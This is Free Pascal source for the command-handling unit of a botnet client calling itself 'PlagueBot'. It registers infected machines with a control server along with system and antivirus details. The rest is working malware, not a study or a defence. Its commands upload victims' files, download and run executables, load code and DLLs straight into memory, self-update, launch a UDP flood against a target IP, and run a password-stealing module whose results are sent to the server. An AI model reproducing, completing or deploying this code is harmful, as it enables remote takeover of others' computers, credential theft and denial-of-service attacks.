unit CmdWorker;

{$mode objfpc}{$H+}

interface

uses
  NetModule, Tools,
  Classes, SysUtils, IdMultipartFormData, Process, IdHTTP, WExecFromMem,
  BTMemoryModule, IdUDPClient;

type
  TCmdWorker = class(TThread)
  Hat: TIdHTTP;
  ToPost: TIdMultipartFormDataStream;
  private
    FCmdID: String;
    FIndex: LongInt;
    procedure DownloadFile(URL: String; var MS: TMemoryStream);
    function ExecuteModule(URL, Params: String): Boolean;
  public
    property Identifier: String read FCmdID write FCmdID;
    constructor Create(CmdID: String; Index: LongInt);
    destructor Destroy; override;
    procedure Execute; override;
    procedure Abort(AbortID: String);
  end;

  TWorkers = Array of TCmdWorker;

var
  Workers: TWorkers;

function ExecIndex(CmdID: String): LongInt;
function FindAPlace: LongInt;

implementation

//Functions used by commands

procedure TCmdWorker.DownloadFile(URL: String; var MS: TMemoryStream);
Begin
  try
    Hat.Get(URL, MS);
  except
  end;
  MS.Position:=0;
end;

function TCmdWorker.ExecuteModule(URL, Params: String): Boolean;
var
  MS: TMemoryStream;
Begin
  Result:=True;
  MS:=TMemoryStream.Create;
  try
    DownloadFile(URL, MS);
    Result:=(ExecFromMem(FullName, Params, MS.Memory)<>0);
  except
    on E: Exception do Result:=False;
  end;
end;

//General functions and Command Execution

function FindAPlace: LongInt;
var
  J: LongInt;
  Found: Boolean;
Begin
  Found:=False;
  For J:=Low(Workers) to High(Workers) do
  if Not(Assigned(Workers[J])) then Begin
    Result:=J;
    Found:=True;
    Break;
  end;
  if Not(Found) then Begin
    J:=High(Workers) + 1;
    SetLength(Workers, J + 1);
    Result:=J;
  end;
end;

function ExecIndex(CmdID: String): LongInt;
var
  J: LongInt;
Begin
  Result:=-1;
  For J:=Low(Workers) to High(Workers) do
  if Assigned(Workers[J]) then
  if Workers[J].Identifier=CmdID then Begin
    Result:=J;
    Break;
  end;
end;

constructor TCmdWorker.Create(CmdID: String; Index: LongInt);
Begin
  FreeOnTerminate:=True;
  FCmdID:=CmdID;
  FIndex:=Index;
  Hat:=TIdHTTP.Create(Nil);
  Hat.HandleRedirects:=True;
  inherited Create(False);
end;

destructor TCmdWorker.Destroy;
Begin
  Hat.Free;
  ToPost.Free;
  inherited Destroy;
  Workers[FIndex]:=Nil;
end;

procedure TCmdWorker.Abort(AbortID: String);
var
  _ToPost: TIdMultipartFormDataStream;
Begin
  _ToPost:=TIdMultipartFormDataStream.Create;
  _ToPost.AddFormField('GUID', ID);
  _ToPost.AddFormField('ID', AbortID);
  _ToPost.AddFormField('RT', '1');
  _ToPost.AddFormField('Result', 'Abort successful.');
  Writeln('[',FIndex,'] ABORT-POST --> ',Hat.Post(Server+ResultsPHP, _ToPost));
  _ToPost.Free;
  Terminate;
end;

procedure TCmdWorker.Execute;
var

  Master: TProcess;
  MemStream: TMemoryStream;
  Error: Boolean = False;

  MemDLLData: Pointer;
  MemDLLModule: PBTMemoryModule;

  UP: TIdUDPClient;
  SMessage: String;

  procedure DoPost;
  Begin
    try
     Writeln('[',FIndex,'] CMD-POST --> ',Hat.Post(Server+ResultsPHP, ToPost));
    except
    end;
  end;

Begin
  Hat.Request.Connection:='keep-alive';
  Hat.Request.UserAgent:='PlagueBot';
  ToPost:=TIdMultipartFormDataStream.Create;
  ToPost.AddFormField('GUID', ID);
  ToPost.AddFormField('ID', FCmdID);
  Case Net.Commands.ReadString(FCmdID, 'Type', '') of
    'Register': Begin
      ToPost.AddFormField('RT', '3');

      AnalyzeSystem;
      ToPost.AddFormField('Nick', Nick);
      ToPost.AddFormField('OS', OS);
      ToPost.AddFormField('Comp', ComputerName);
      ToPost.AddFormField('User', UserName);
      ToPost.AddFormField('CPU', CPU);
      ToPost.AddFormField('GPU', GPU);
      ToPost.AddFormField('Anti', AVName);
      ToPost.AddFormField('Def', AVState);
      ToPost.AddFormField('Inf', Settings.ReadString('General', 'InfectedBy', 'Unknown'));
      DoPost;
    end;
    'Restart': Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Restarting.');
      DoPost;
      Restart(FullName);
    end;
    'Update': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        RenameFile(FullName, FileName+'.old');
        MemStream.SaveToFile(FullName);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Update failed: '+E.Message);
          DoPost;
        end;
      end;
      MemStream.Free;
      if Not(Error) then Begin
        ToPost.AddFormField('Result', 'File downloaded, update in progress.');
        DoPost;
        Restart(FullName, True);
      end;
    end;
    'Uninstall': Begin

    end;
    'Upload': Begin
      ToPost.AddFormField('RT', '2');
      ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
      DoPost;
    end;
    'Download': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        MemStream.SaveToFile(Net.Commands.ReadString(FCmdID, 'LocalName', 'Temp.tmp'));
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      MemStream.Free;
      if Not(Error) then
        ToPost.AddFormField('Result', 'Download successful.');
      DoPost;
    end;
    'DropExec': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
        MemStream.SaveToFile('Drop.exe');
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      MemStream.Free;
      if Not(Error) then Begin
        if FileExists('Drop.exe') then Begin
          Master:=TProcess.Create(Nil);
          try
            Master.Executable:='Drop.exe';
            Master.InheritHandles:=False;
            Master.Execute;
          except
            on E: Exception do Begin
              Error:=True;
              ToPost.AddFormField('Result', 'Execution failed: '+E.Message);
            end;
          end;
          Master.Free;
          if Not(Error) then ToPost.AddFormField('Result', 'Execution successful.');
        end else ToPost.AddFormField('Result', 'The dropped file doesn''t exist!');
      end;
      DoPost;
    end;
    'MemExec': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      if Not(Error) then Begin
        if(ExecFromMem(FullName, '', MemStream.Memory)<>0) then
        ToPost.AddFormField('Result', 'Execution successful.')
        else ToPost.AddFormField('Result', 'Execution failed!');
      End;
      MemStream.Free;
      DoPost;
    end;
    'MemDLL': Begin
      ToPost.AddFormField('RT', '1');
      MemStream:=TMemoryStream.Create;
      try
        DownloadFile(
            Net.Commands.ReadString(FCmdID, 'URL', ''),
            MemStream);
      except
        on E: Exception do Begin
          Error:=True;
          ToPost.AddFormField('Result', 'Download failed: '+E.Message);
        end;
      end;
      if Not(Error) then Begin
        MemDLLData:=GetMemory(MemStream.Size);
        MemStream.Read(MemDLLData^, MemStream.Size);
        MemDLLModule:=BTMemoryModule.BTMemoryLoadLibary(MemDLLData, MemStream.Size);
        if MemDLLModule<>Nil then
        ToPost.AddFormField('Result', 'Execution successful.')
        else ToPost.AddFormField('Result', 'Failed to load the DLL into memory!');
      end;
      MemStream.Free;
      DoPost;
    end;
    'Flood': Begin
      ToPost.AddFormField('RT', '1');
      UP:=TIdUDPClient.Create(Nil);
      UP.Host:=Net.Commands.ReadString(FCmdID, 'IPAddress',
        Settings.ReadString('Flood', 'DefaultIP', '1.1.1.1'));
      UP.Port:=Net.Commands.ReadInt64(FCmdID, 'Port',
        Settings.ReadInt64('Flood', 'Port', 80));
      SMessage:=Settings.ReadString('Flood', 'Message', 'A cat is fine too. Desudesudesu~');
      if Settings.ReadBool('Flood', 'MaxPower', True) then Begin
        While Not(Terminated) do Begin
          UP.Send(SMessage);
        end;
      end else Begin
        While Not(Terminated) do Begin
          UP.Send(SMessage);
          Sleep(1);
        end;
      end;
      UP.Free;
      ToPost.AddFormField('Result', 'Flood over!');
      DoPost;
    end;
    'Mine': Begin
    end;
    'Passwords': Begin
      Error:=True; //Not feeling too positive today
      if ExecuteModule(Server+PassModule, '/shtml P.html') then Begin
        Sleep(2000);
        if FileExists('P.html') then Begin
          Error:=False;
          ToPost.AddFormField('RT', '2');
          ToPost.AddFile('File', 'P.html');
        end;
      end;
      if Error then Begin
        ToPost.AddFormField('RT', '1');
        ToPost.AddFormField('Result', 'Failed to execute the password module.');
      end;
      DoPost;
      if FileExists('P.html') then DeleteFile('P.html');
    end
    else Begin
      ToPost.AddFormField('RT', '1');
      ToPost.AddFormField('Result', 'Unknown command!');
      DoPost;
    end;
  end;
  Writeln('Thread [',FIndex,'] exited.');
  Sleep(1000); //Used to prevent the client from accidentally performing the same command again
end;

end.

